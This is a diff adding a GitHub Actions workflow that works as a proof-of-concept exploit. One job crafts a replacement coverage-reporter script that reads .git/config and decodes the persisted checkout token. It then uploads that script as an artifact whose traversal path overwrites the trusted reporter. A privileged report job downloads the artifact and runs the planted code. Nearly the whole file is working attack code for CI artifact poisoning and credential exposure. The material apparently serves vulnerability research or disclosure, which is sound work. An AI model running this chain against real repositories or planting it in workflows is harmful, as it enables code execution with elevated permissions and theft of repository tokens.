@@ -1,0 +1,84 @@
+name: ZZ Core Mobile Artifact RCE Probe
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  upstream:
+    name: Upstream (attacker-controlled PR run)
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@v4
+      - name: Craft attacker payload reporter
+        run: |
+          mkdir -p poc-payload
+          cat > poc-payload/summarizeCoverage.js <<'JS'
+          const fs = require('fs')
+          console.log('PWNED_IN_PRIVILEGED_REPORT_JOB')
+          console.log('GITHUB_JOB=' + process.env.GITHUB_JOB)
+          try {
+            const cfg = fs.readFileSync('.git/config', 'utf8')
+            const m = cfg.match(/AUTHORIZATION: basic (\S+)/i)
+            if (m) {
+              const decoded = Buffer.from(m[1], 'base64').toString()
+              console.log('PERSISTED_CHECKOUT_TOKEN_PRESENT=yes user=' + decoded.split(':')[0])
+            } else {
+              console.log('PERSISTED_CHECKOUT_TOKEN_PRESENT=no')
+            }
+          } catch (e) {
+            console.log('CONFIG_READ_ERROR=' + e.message)
+          }
+          fs.writeFileSync('rce-proof.txt', 'executed by attacker-controlled reporter\n')
+          JS
+      - name: Install artifact client used by real upload-artifact
+        working-directory: .github/actions/plant-v8
+        run: npm install @actions/artifact@2.3.2 --no-save --silent
+      - name: Upload crafted artifact with traversal entry
+        uses: ./.github/actions/plant-v8
+        with:
+          name: mobile-pr-coverage
+          source: poc-payload/summarizeCoverage.js
+          target: scripts/github/coverage/summarizeCoverage.js
+
+  report:
+    name: Coverage Report (mirrors target privileges)
+    needs: upstream
+    runs-on: ubuntu-latest
+    permissions:
+      actions: read
+      checks: write
+      contents: read
+      issues: write
+      pull-requests: write
+    steps:
+      - name: Check out trusted reporter code
+        uses: actions/checkout@v4
+        with:
+          repository: ${{ github.repository }}
+          ref: main
+      - name: Create artifact directory
+        run: mkdir -p coverage-artifacts
+      - name: Download coverage artifact
+        uses: actions/download-artifact@v5
+        with:
+          github-token: ${{ github.token }}
+          run-id: ${{ github.run_id }}
+          name: mobile-pr-coverage
+          path: coverage-artifacts
+      - name: Generate coverage summary
+        run: |
+          node scripts/github/coverage/summarizeCoverage.js \
+            --artifacts-dir coverage-artifacts \
+            --run-url "https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}" \
+            --json-out coverage-report.json \
+            --markdown-out coverage-report.md
+      - name: Evidence
+        if: always()
+        run: |
+          echo "--- rce proof file:"; cat rce-proof.txt 2>/dev/null || echo NO_RCE_PROOF
